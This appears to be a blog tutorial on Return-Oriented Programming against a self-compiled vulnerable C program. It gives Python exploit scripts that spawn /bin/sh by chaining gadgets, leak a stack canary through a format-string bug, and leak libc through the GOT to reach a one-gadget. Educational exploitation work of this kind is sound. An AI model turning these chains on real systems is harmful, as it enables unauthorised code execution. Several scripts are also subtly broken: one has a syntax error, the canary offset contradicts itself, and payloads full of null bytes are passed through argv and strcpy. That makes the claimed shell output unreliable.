---
title: "Return-Oriented Programming: Chaining Gadgets to Defeat Modern Memory Defenses"
published: 2025-09-12 10:00:00+00:00
draft: false
description: "A deep technical dive into Return-Oriented Programming (ROP): how attackers build gadget chains to bypass NX/DEP, ASLR, and stack canaries, with complete working exploits in C and Python."
tags: ["ROP", "Binary Exploitation", "Security", "Assembly", "x86_64", "Memory Exploitation", "Exploit Development", "Linux"]
toc: true
---

Modern operating systems ship with a layered set of memory-safety mitigations: non-executable stacks (NX/DEP), address space layout randomization (ASLR), stack canaries, and position-independent executables (PIE). Individually, each raises the cost of exploitation. Together, they are designed to make stack-based code injection practically impossible.

They do not stop a determined attacker. They change the game.

Return-Oriented Programming (ROP) is the technique that broke NX/DEP wide open and forced the security community to invent the next generation of defenses. Instead of injecting shellcode, the attacker *reuses* code that already exists in the binary — tiny instruction sequences called **gadgets** that end in a `ret` instruction. String them together, and you control the CPU.

This post covers ROP from first principles through practical exploit construction. You will need a working knowledge of x86-64 assembly, the Linux calling convention, and C memory layout. By the end, you will have written a working ROP exploit against a custom vulnerable program, bypassing both NX and a stack canary leak.

---

## Why ROP Exists: The Arms Race

### The Original Problem — Shellcode

Classic buffer overflows were clean: overflow a buffer, overwrite the saved return address with the address of your shellcode, and the CPU executes your injected code.

```
[ Stack before overflow ]          [ Stack after overflow ]
+------------------------+         +------------------------+
| saved rbp              |         | saved rbp (corrupted)  |
| saved rip → main+42    |  →→→→   | saved rip → &shellcode |
| local buf[64]          |         | NOP sled + shellcode   |
+------------------------+         +------------------------+
```

This required three conditions: (1) write-what-where via a buffer overflow, (2) knowledge of where the shellcode lands, (3) the stack to be **executable**.

### NX/DEP Kills Shellcode Injection

The **No-Execute (NX) bit** (called Data Execution Prevention, DEP, on Windows) marks the stack and heap as non-executable at the hardware level via the page table entry. The CPU raises a fault if the instruction pointer ever points into a non-executable page.

On Linux/x86-64, the kernel sets this for every new process by default. GCC produces NX-enabled binaries unless you explicitly pass `-z execstack`.

```bash
$ readelf -l ./vulnerable | grep -A1 GNU_STACK
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
```

The `RW` (no `E`) means the stack is not executable. Jumping to shellcode on the stack now crashes instead of executes.

### ret2libc — The First Workaround

The immediate response was **return-to-libc (ret2libc)**: instead of jumping to shellcode, jump to a real function in `libc` — specifically `system("/bin/sh")`. No injected code required; you're calling code the OS loaded itself.

```
saved rip → &system
[argument: ptr to "/bin/sh" string]
```

This worked for a while. ASLR broke it by randomizing `libc`'s base address. But ret2libc was a hint: *if you can chain function calls, you can do anything.* ROP generalized this insight.

### ROP — The General Solution

In 2007, Hovav Shacham published *"The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls"*, introducing the term **Return-Oriented Programming**. The insight:

> Every `ret` instruction pops the next value off the stack into `rip`. If you control the stack, you control a sequence of `ret` instructions — effectively a *return-driven interpreter*.

A **gadget** is any sequence of instructions ending in `ret`:

```asm
pop rdi ; ret       ; loads rdi from stack, then "returns" to next gadget
xor rax, rax ; ret  ; zeroes rax
syscall ; ret        ; invokes the kernel
```

Chain gadgets by placing their addresses consecutively on the stack. Each `ret` pops the *next address*, transferring control to the *next gadget*. The result: a Turing-complete computation engine built entirely from existing binary code, no injection required.

---

## The x86-64 Foundation

Before building chains, you need to deeply understand what `ret` actually does.

### What `ret` Does at the Hardware Level

```asm
; ret is equivalent to:
pop rip
; which is:
mov rip, [rsp]
add rsp, 8
```

`rsp` always points to the *top of the stack*. `ret` pops 8 bytes off the stack (on 64-bit) into `rip`, which is the instruction pointer. Control flows to whatever address was on top of the stack.

When an attacker overwrites the saved return address on the stack, the next `ret` pops the attacker's chosen address into `rip`. If that address is a gadget ending in `ret`, *that* gadget's `ret` pops the *next* attacker-controlled address from the stack.

### The ROP Stack Layout

A ROP payload is a sequence of addresses (8 bytes each on x86-64) placed on the stack starting at the location of the overwritten return address:

```
High address
+-------------------------------+
| addr of gadget N              |  ← popped last
| data for gadget N             |
| ...                           |
| addr of gadget 2              |
| data for gadget 2 (if needed) |
| addr of gadget 1              |  ← popped first (overwrites saved rip)
+-------------------------------+
Low address (start of overflow)
```

Each `pop ; ret` gadget both *uses* one stack slot (for its operand) and *advances* to the next gadget address via the `ret`.

### Linux x86-64 Syscall Convention

To make a raw syscall on Linux x86-64:

| Purpose      | Register |
|:-------------|:---------|
| Syscall number | `rax` |
| Arg 1        | `rdi`    |
| Arg 2        | `rsi`    |
| Arg 3        | `rdx`    |
| Arg 4        | `r10`    |
| Arg 5        | `r8`     |
| Arg 6        | `r9`     |
| Invoke       | `syscall` |

To call `execve("/bin/sh", NULL, NULL)`:

- `rax = 59` (execve syscall number)
- `rdi = pointer to "/bin/sh"`
- `rsi = 0`
- `rdx = 0`
- execute `syscall`

A ROP chain that achieves this needs gadgets to set each register, plus the `/bin/sh` string somewhere in writable memory (or already present in libc).

---

## Building the Lab

### Vulnerable Program

```c
// vuln.c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

// gcc -o vuln vuln.c -fno-stack-protector -no-pie -z norelro
// (NX is still enabled by default — we are NOT passing -z execstack)

void vulnerable(char *input) {
    char buf[64];
    // Classic unsafe copy — no bounds checking
    strcpy(buf, input);
}

int main(int argc, char **argv) {
    if (argc < 2) {
        puts("Usage: ./vuln <input>");
        return 1;
    }
    vulnerable(argv[1]);
    return 0;
}
```

Compile with:

```bash
gcc -o vuln vuln.c \
    -fno-stack-protector \  # disable canary for now
    -no-pie \               # disable PIE (fixed addresses)
    -z norelro              # disable RELRO for full GOT writes
    # NX is ON by default — stack is not executable
```

Verify NX is on and PIE is off:

```bash
$ checksec --file=./vuln
[*] '/tmp/rop-lab/vuln'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled          ← good, we're testing ROP
    PIE:      No PIE (0x400000)   ← fixed base, simpler to start
```

### Finding the Overflow Offset

Use a De Bruijn cyclic pattern to find exactly how many bytes before we control `rip`:

```python
# gen_pattern.py
import sys

def cyclic(length, n=4):
    """Generate a De Bruijn sequence of given length."""
    alphabet = b"abcdefghijklmnopqrstuvwxyz"
    pattern = bytearray()
    k = len(alphabet)
    sequence = []

    def db(t, p):
        if t > length:
            return
        if t % p == 0:
            sequence.extend(sequence[1:p+1])
        for j in range(sequence[t - p], k):
            sequence.append(j)
            db(t + 1, p if j == sequence[t - p] else t)
            sequence.pop()

    sequence = [0]
    db(1, 1)
    return bytes(alphabet[i] for i in sequence[:length])

print(cyclic(200).decode())
```

```bash
$ python3 gen_pattern.py > /tmp/pattern
$ gdb -q ./vuln
(gdb) run $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*200)")
Program received signal SIGSEGV.
(gdb) info registers rsp
rsp  0x7fffffffdc78
(gdb) x/xg $rsp-8
0x7fffffffdc70:  0x4141414141414141
```

By examining the corrupted `rip` value in the core dump and searching for its position in the pattern, we determine the offset. For our 64-byte buffer with a 16-byte stack frame (saved rbp + alignment), the offset to `rip` is **72 bytes** (64 + 8 bytes for saved rbp).

Verify:

```python
# check_offset.py
payload = b"A" * 72 + b"B" * 8
sys.stdout.buffer.write(payload)
```

```bash
(gdb) run $(python3 check_offset.py)
(gdb) x/xg $rsp-8
0x...: 0x4242424242424242   # "BBBBBBBB" — confirmed offset 72
```

---

## Finding Gadgets

### ROPgadget

`ROPgadget` scans an ELF for instruction sequences ending in `ret`. Install it:

```bash
pip3 install ROPgadget
```

Find all gadgets in our binary and libc:

```bash
$ ROPgadget --binary ./vuln --rop | head -40
Gadgets information
============================================================
0x0000000000401125 : add al, 0 ; add byte ptr [rax - 0x77], cl ; ret
0x0000000000401016 : add byte ptr [rax], al ; ret
0x0000000000401019 : add byte ptr [rbp - 0x3d], dil ; ret
0x000000000040101a : call 0x401040
0x0000000000401158 : leave ; ret
0x000000000040101e : mov byte ptr [rip + 0x2ffb], 1 ; pop rbp ; ret
0x0000000000401030 : pop rbp ; ret
0x0000000000401176 : pop rdi ; ret      ← key gadget!
0x0000000000401172 : pop rsi ; ret      ← key gadget!
0x000000000040116d : pop rdx ; ret      ← key gadget!
0x000000000040117a : syscall ; ret      ← the money gadget
...
```

The gadgets `pop rdi ; ret`, `pop rsi ; ret`, `pop rdx ; ret`, and `syscall ; ret` are everything we need to call `execve` directly.

### Searching for Specific Gadgets

```bash
# Find all "pop rdi ; ret" gadgets
$ ROPgadget --binary ./vuln --rop | grep "pop rdi"
0x0000000000401176 : pop rdi ; ret

# Find writable memory to store "/bin/sh"
$ ROPgadget --binary ./vuln --rop | grep "mov qword ptr"
0x0000000000401160 : mov qword ptr [rdi], rsi ; ret

# Find the BSS section (writable, fixed address, no PIE)
$ readelf -S ./vuln | grep -E "\.bss|\.data"
  [25] .data             PROGBITS         0000000000404010 ...  WA
  [26] .bss              NOBITS           0000000000404020 ...  WA
```

The `.bss` section at `0x404020` is writable and has a fixed address (no PIE). We can write `/bin/sh` there.

---

## Constructing the ROP Chain

### Strategy

1. Write the string `/bin/sh\x00` into `.bss` using gadgets
2. Set `rdi = address of "/bin/sh"` in `.bss`
3. Set `rsi = 0`
4. Set `rdx = 0`
5. Set `rax = 59` (execve syscall)
6. Execute `syscall`

### Gadget Inventory

From `ROPgadget` output:

```
pop_rdi     = 0x0000000000401176
pop_rsi     = 0x0000000000401172
pop_rdx     = 0x000000000040116d
pop_rax     = 0x0000000000401168
mov_ptr_rdi_rsi = 0x0000000000401160   # mov [rdi], rsi ; ret
syscall_ret = 0x000000000040117a
bss_addr    = 0x0000000000404020
```

### Writing "/bin/sh" into BSS

The string `/bin/sh\x00` is 8 bytes — exactly one 64-bit write. We need:

```
pop rdi ; ret       → rdi = bss_addr
pop rsi ; ret       → rsi = "/bin/sh\x00" (as 8 bytes of integer)
mov [rdi], rsi ; ret → writes "/bin/sh\x00" to bss_addr
```

In Python:

```python
import struct

bss_addr = 0x404020
binsh = b"/bin/sh\x00"
binsh_int = struct.unpack("<Q", binsh)[0]  # little-endian 64-bit integer

write_chain = (
    struct.pack("<Q", pop_rdi) +
    struct.pack("<Q", bss_addr) +
    struct.pack("<Q", pop_rsi) +
    struct.pack("<Q", binsh_int) +
    struct.pack("<Q", mov_ptr_rdi_rsi)
)
```

### Setting Up the Syscall Arguments

```python
execve_chain = (
    struct.pack("<Q", pop_rdi) +
    struct.pack("<Q", bss_addr) +    # rdi = ptr to "/bin/sh"
    struct.pack("<Q", pop_rsi) +
    struct.pack("<Q", 0) +           # rsi = NULL
    struct.pack("<Q", pop_rdx) +
    struct.pack("<Q", 0) +           # rdx = NULL
    struct.pack("<Q", pop_rax) +
    struct.pack("<Q", 59) +          # rax = execve syscall number
    struct.pack("<Q", syscall_ret)   # syscall
)
```

### Complete Exploit

```python
#!/usr/bin/env python3
# exploit_no_canary.py
# Target: ./vuln compiled without stack canary, with NX, without PIE

import struct
import subprocess
import sys

# ── Gadget addresses (from ROPgadget) ─────────────────────────────────────────
pop_rdi          = 0x0000000000401176
pop_rsi          = 0x0000000000401172
pop_rdx          = 0x000000000040116d
pop_rax          = 0x0000000000401168
mov_ptr_rdi_rsi  = 0x0000000000401160  # mov qword ptr [rdi], rsi ; ret
syscall_ret      = 0x000000000040117a
bss_addr         = 0x0000000000404020  # writable fixed-address storage

# ── Helpers ───────────────────────────────────────────────────────────────────
def p64(val):
    return struct.pack("<Q", val)

# ── Build payload ─────────────────────────────────────────────────────────────
offset = 72  # bytes to reach saved rip

# Step 1: Write "/bin/sh\x00" into BSS
binsh_int = struct.unpack("<Q", b"/bin/sh\x00")[0]

write_binsh = (
    p64(pop_rdi)         +   # gadget: pop rdi ; ret
    p64(bss_addr)        +   #   → rdi = &bss (destination for write)
    p64(pop_rsi)         +   # gadget: pop rsi ; ret
    p64(binsh_int)       +   #   → rsi = "/bin/sh\x00" as integer
    p64(mov_ptr_rdi_rsi) +   # gadget: mov [rdi], rsi ; ret  (writes string)
)

# Step 2: execve("/bin/sh", NULL, NULL) via raw syscall
execve = (
    p64(pop_rdi)    + p64(bss_addr) +  # rdi = ptr to "/bin/sh"
    p64(pop_rsi)    + p64(0)        +  # rsi = NULL (argv)
    p64(pop_rdx)    + p64(0)        +  # rdx = NULL (envp)
    p64(pop_rax)    + p64(59)       +  # rax = 59 (execve)
    p64(syscall_ret)                   # syscall
)

payload = b"A" * offset + write_binsh + execve

# ── Launch ─────────────────────────────────────────────────────────────────────
print(f"[*] Payload length: {len(payload)} bytes", file=sys.stderr)
print(f"[*] Gadget chain: write /bin/sh → execve syscall", file=sys.stderr)

subprocess.run(["./vuln", payload])
```

Run it:

```bash
$ python3 exploit_no_canary.py
[*] Payload length: 184 bytes
[*] Gadget chain: write /bin/sh → execve syscall
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ whoami
user
```

Shell obtained. NX bypassed entirely using existing code — not a single injected byte executed.

---

## Stack Canaries: The Next Layer

A stack canary is a random value placed between the local variables and the saved frame pointer on the stack. Before a function returns, the canary is checked against the original. If it changed (because an overflow overwrote it), the program aborts.

```
High address
+------------------------+
| saved rip              |
| saved rbp              |
| canary (8 bytes)       | ← must not be overwritten
| local buf[64]          |
+------------------------+
Low address
```

Compile with canary:

```bash
gcc -o vuln_canary vuln.c -no-pie -z norelro
# Note: removed -fno-stack-protector
```

```bash
$ checksec --file=./vuln_canary
    Stack:    Canary found         ← now protected
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

A blind overflow no longer works — it corrupts the canary and triggers `__stack_chk_fail`.

### Defeating Canaries via Information Leak

The classic bypass: **leak the canary value first**, then include it verbatim in the overflow so the check passes.

Add a format string bug (a common real-world combination):

```c
// vuln_leak.c
#include <stdio.h>
#include <string.h>

void vulnerable(char *fmt, char *buf) {
    char local[64];
    // Bug 1: format string leak — lets us read the stack
    printf(fmt);
    // Bug 2: buffer overflow — lets us control rip
    strcpy(local, buf);
}

int main(int argc, char **argv) {
    if (argc < 3) {
        puts("Usage: ./vuln_leak <fmt> <buf>");
        return 1;
    }
    vulnerable(argv[1], argv[2]);
    return 0;
}
```

The format string `%p.%p.%p.%p.%p.%p.%p` prints stack addresses, including the canary.

#### Finding the Canary's Stack Position

The canary is at a fixed offset from `rsp` inside the function frame. In GDB:

```bash
(gdb) break vulnerable
(gdb) run "%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p" "AAAA"
(gdb) x/20gx $rsp
0x7fffffffdb60: 0x00007fffffffdb80  0x00007ffff7a05b97
0x7fffffffdb70: 0x0000000000000001  0x00007fffffffdc88
0x7fffffffdb80: 0x00007fffffffdb90  0x56b1eaac4dd1be00  ← canary (ends in \x00)
0x7fffffffdb90: 0x0000000000000000  0x00007ffff7a05b97
```

The canary value `0x56b1eaac4dd1be00` is at position `%7$p` on the format string argument stack (count the pointers). Canaries always end in a null byte (`\x00`) to defeat string-based reads that stop at null.

#### Exploit with Canary Leak

```python
#!/usr/bin/env python3
# exploit_canary.py

import struct
import subprocess
import sys
import re

# ── Gadget addresses ──────────────────────────────────────────────────────────
pop_rdi          = 0x00000000004011d6
pop_rsi          = 0x00000000004011d2
pop_rdx          = 0x00000000004011cd
pop_rax          = 0x00000000004011c8
mov_ptr_rdi_rsi  = 0x00000000004011c0
syscall_ret      = 0x00000000004011da
bss_addr         = 0x0000000000404020

def p64(v): return struct.pack("<Q", v)

# ── Phase 1: Leak the canary ───────────────────────────────────────────────────
# The canary is at %11$p on the printf stack (determined via GDB)
fmt_string = b"%11$p"
result = subprocess.run(
    ["./vuln_leak", fmt_string, b"A"],
    capture_output=True
)
leaked = result.stdout.strip()
canary = int(leaked, 16)
print(f"[*] Leaked canary: {hex(canary)}", file=sys.stderr)
assert canary & 0xff == 0, "Canary should end in null byte"

# ── Phase 2: Overflow with correct canary ─────────────────────────────────────
# Stack layout in vulnerable():
#   [64 bytes local] [8 bytes canary] [8 bytes saved rbp] [8 bytes saved rip]
# Offset to canary = 64
# Offset to saved rip = 64 + 8 (canary) + 8 (rbp) = 80

binsh_int = struct.unpack("<Q", b"/bin/sh\x00")[0]

write_binsh = (
    p64(pop_rdi)        + p64(bss_addr)   +
    p64(pop_rsi)        + p64(binsh_int)  +
    p64(mov_ptr_rdi_rsi)
)

execve = (
    p64(pop_rdi) + p64(bss_addr) +
    p64(pop_rsi) + p64(0)        +
    p64(pop_rdx) + p64(0)        +
    p64(pop_rax) + p64(59)       +
    p64(syscall_ret)
)

payload = (
    b"A" * 64        +   # fill local buffer
    p64(canary)      +   # overwrite canary with correct value — check passes!
    b"B" * 8         +   # overwrite saved rbp (don't care)
    write_binsh      +   # ROP chain start (overwrites saved rip)
    execve
)

print(f"[*] Payload length: {len(payload)} bytes", file=sys.stderr)
subprocess.run(["./vuln_leak", b"X", payload])
```

The canary check passes because we placed the leaked value back at the correct offset. The overflow still reaches `rip` and our ROP chain executes.

---

## ASLR and PIE: Leaking libc

With ASLR enabled and PIE on, all addresses — binary, libc, stack, heap — are randomized per process invocation. Our fixed gadget addresses no longer work.

```bash
# Enable ASLR system-wide (usually on by default)
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

$ ldd ./vuln_pie
    linux-vdso.so.1 => (0x00007ffe6c3f8000)  # changes each run!
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f8d4e200000)  # changes!
```

### The Two-Stage Exploit

The standard bypass uses a two-stage exploit:

1. **Stage 1** — Leak a libc address from the GOT using a partial ROP chain, then `ret` back to `main` (or `vulnerable`)
2. **Stage 2** — Now that we know libc's base, compute the real gadget addresses and execute the full payload

#### Stage 1: Leaking puts@GOT via puts@PLT

The **GOT (Global Offset Table)** contains the runtime address of libc functions after dynamic linking resolves them. `puts@GOT[0]` holds the actual address of `puts` in libc. `puts@PLT` is a trampoline that calls through to `puts@GOT` — we can *call* it to print any memory address.

Chain:
```
pop rdi ; ret      → rdi = address of puts@GOT
call puts@PLT      → prints the 8-byte address stored at puts@GOT
ret to main        → restart so we can send Stage 2
```

```python
#!/usr/bin/env python3
# exploit_aslr.py
import struct, subprocess, sys, re

# These are fixed (PIE disabled for this example; with PIE you'd need another leak first)
pop_rdi_ret = 0x0000000000401176
puts_plt    = 0x0000000000401030   # PLT stub for puts
puts_got    = 0x0000000000404018   # GOT entry for puts
main_addr   = 0x0000000000401158   # restart point

def p64(v): return struct.pack("<Q", v)

# ── Stage 1: Leak puts() address from GOT ─────────────────────────────────────
offset = 72
stage1 = (
    b"A" * offset         +
    p64(pop_rdi_ret)      +   # pop rdi
    p64(puts_got)         +   #   → rdi = &puts@GOT
    p64(puts_plt)         +   # call puts(rdi)  → prints 8 bytes of puts's address
    p64(main_addr)            # return to main for Stage 2
)

result = subprocess.run(
    ["./vuln_pie", stage1],
    capture_output=True
)

# Parse the leaked address (8 raw bytes, little-endian)
raw = result.stdout[:8].ljust(8, b"\x00")
puts_addr = struct.unpack("<Q", raw)[0]
print(f"[*] puts() @ {hex(puts_addr)}", file=sys.stderr)

# ── Compute libc base from symbol offset ──────────────────────────────────────
# Requires knowing which libc version is loaded:
#   readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " puts@@"
puts_offset  = 0x080e50   # offset of puts in this libc build
libc_base    = puts_addr - puts_offset
print(f"[*] libc base @ {hex(libc_base)}", file=sys.stderr)

# ── Stage 2: execve with real libc gadget addresses ───────────────────────────
# Common one-gadget: execve("/bin/sh", ...) with constraints
# Found via: one_gadget /lib/x86_64-linux-gnu/libc.so.6
one_gadget_offset = 0xe3afe   # depends on libc version, check with one_gadget tool
one_gadget = libc_base + one_gadget_offset

stage2 = b"A" * offset + p64(one_gadget)

print(f"[*] one_gadget @ {hex(one_gadget)}", file=sys.stderr)
subprocess.run(["./vuln_pie", stage2])
```

A **one-gadget** (also called `magic gadget`) is a single address in libc that, when jumped to with the right register preconditions, directly calls `execve("/bin/sh", ...)` without requiring a full ROP chain. The `one_gadget` tool finds them:

```bash
$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

With a libc leak and a one-gadget, the two-stage exploit collapses to roughly 20 lines.

---

## Advanced Techniques

### Stack Pivoting

Sometimes the overflow is too small to fit a full ROP chain in-place. **Stack pivoting** relocates `rsp` to attacker-controlled memory elsewhere (heap, BSS) where the full chain lives.

The key gadget:

```asm
xchg rsp, rax ; ret   ; swap rsp with rax (which points to our fake stack)
leave ; ret            ; equivalent to: mov rsp, rbp ; pop rbp — can also pivot
```

With a heap spray or controlled allocation, plant the chain in memory, load its address into `rax`, then `xchg` to pivot:

```
[small overflow area]
saved rip → pop_rax ; ret
            → heap_chain_addr      (address of our fake stack)
            → xchg_rsp_rax ; ret   (rsp now points to heap)
[continues from heap_chain_addr...]
```

### SROP — Sigreturn-Oriented Programming

When gadgets are scarce (stripped binaries, constrained environments), **SROP** exploits the kernel's `sigreturn` mechanism. When a signal is delivered, the kernel pushes a **sigcontext frame** onto the stack containing all register values. On `sigreturn`, it pops them all back.

An attacker who controls the stack can craft a fake sigcontext frame with arbitrary register values and trigger `sigreturn` (syscall number 15 on x86-64):

```python
# Fake sigcontext frame — sets rip=syscall, rax=execve, rdi=&"/bin/sh", etc.
# Requires only: syscall ; ret gadget + pop rax ; ret gadget
```

A single `syscall ; ret` gadget plus the ability to set `rax = 15` is enough to call any function via SROP. This is relevant in kernels and minimal `musl libc` environments where traditional gadgets are rare.

### Blind ROP (BROP)

In certain server processes, you may have an overflow but no binary to analyze for gadgets (unknown binary, no symbols). **Blind ROP** probes the remote process's memory through repeated crashing and non-crashing inputs to:

1. Find a "stop gadget" — an address that doesn't crash (e.g., infinite loop or a function that returns normally)
2. Map the stack size and offset by binary search on crash behavior
3. Locate the PLT by identifying addresses that cause a `puts()` call (recognizable by network output)
4. Leak the binary via `puts(plt_address)` and reconstruct gadget addresses

BROP requires many thousands of requests and was first practically demonstrated against nginx by Bittau et al. in 2014.

---

## Defenses and Their Limits

| Defense | What it stops | Bypass |
|:--------|:--------------|:-------|
| **NX/DEP** | Direct shellcode injection | ROP (reuse existing code) |
| **Stack canary** | Blind stack overflow | Info leak, partial overwrite, format string |
| **ASLR** | Fixed-address assumptions | Info leak, brute force (32-bit), heap spray |
| **PIE** | Fixed binary addresses | Leak binary address, then compute all offsets |
| **RELRO (Full)** | GOT overwrites | Can't write to GOT; must leak instead |
| **CFI (forward edges)** | Indirect call targets | Doesn't protect `ret` on its own |
| **Shadow Stack (CET)** | ROP `ret` hijacking | Hardware-enforced; effective against classical ROP |

### Intel CET Shadow Stack

Intel Control-flow Enforcement Technology (CET), available in newer Intel CPUs (Tiger Lake+) and supported in Linux 6.x, adds a *shadow stack*: a separate read-only stack maintained by the CPU that records return addresses. Every `ret` checks the return address against the shadow stack. If they differ — as they would with any ROP chain — the CPU faults.

CET makes classical ROP impractical on supported hardware. The next iteration of bypasses involves CET-aware exploitation (JOP, COP — Jump/Call Oriented Programming) and targeting unchecked pointers in languages without bounds checking.

### Control Flow Integrity (CFI)

Compiler-based CFI (LLVM CFI, Microsoft's CFG) enforces that indirect calls and jumps only target valid function entry points. This restricts *forward-edge* transfers (calls/jumps) but traditionally left `ret` instructions unprotected. Combined with CET's shadow stack for backward-edge (return) protection, modern binaries compiled with full CFI + CET are substantially more resistant to control-flow hijacking.

---

## Essential Tooling

| Tool | Purpose |
|:-----|:--------|
| `ROPgadget` | Find ROP gadgets in ELF/PE/Mach-O |
| `ropper` | Alternative gadget finder with interactive mode |
| `pwntools` | Python exploit framework (ROP builder, GDB integration) |
| `one_gadget` | Find one-shot execve gadgets in libc |
| `GDB + pwndbg` | Dynamic analysis, ROP chain tracing |
| `checksec` | Binary security feature audit |
| `patchelf` | Swap libc versions for local testing |
| `pwninit` | Auto-patches binaries for CTF challenge libc versions |

Using `pwntools`'s built-in ROP builder significantly speeds up chain construction:

```python
from pwn import *

elf = ELF("./vuln")
rop = ROP(elf)

rop.raw(rop.find_gadget(["pop rdi", "ret"])[0])
rop.raw(elf.bss())
# pwntools can resolve gadgets, constants, and even call functions by name
rop.call("puts", [elf.got["puts"]])
rop.call("main")

print(rop.dump())
print(f"Chain: {rop.chain()!r}")
```

---

## Key Takeaways

1. **ROP defeated NX by construction** — it never injects code. Every instruction executed already existed in the binary or loaded libraries. NX protects against code *injection*, not code *reuse*.

2. **Gadgets are everywhere** — any moderately sized binary or linked libc contains thousands of `ret`-ending sequences. You don't need perfect gadgets; creative sequencing and side effects can substitute for missing ones.

3. **Info leaks are the force multiplier** — ASLR and PIE are serious obstacles, but a single memory read primitive (format string, out-of-bounds read, use-after-free info disclosure) collapses them entirely. Defense in depth without a leak mitigation is leaky by definition.

4. **The two-stage model is standard** — leak a libc address, compute the base, send the real chain. This pattern applies to the vast majority of modern CTF challenges and real-world exploits.

5. **CET + CFI is the real countermeasure** — compiling with full CFI and running on CET-capable hardware closes the classical ROP door. Until those are universally deployed, ROP remains a live technique.

6. **Understand the stack machine model** — ROP is not magic. It is a mechanical consequence of the x86 `ret` instruction popping `rip` from `rsp`. Master the calling convention, understand what `ret` actually does, and the rest follows from first principles.

The arms race continues. JOP, COOP, data-only attacks, and heap-based exploitation push past CFI+CET. But every new technique is built on the same foundation: a precise understanding of the processor's execution model and the gap between what the CPU *does* and what the programmer *intended*.
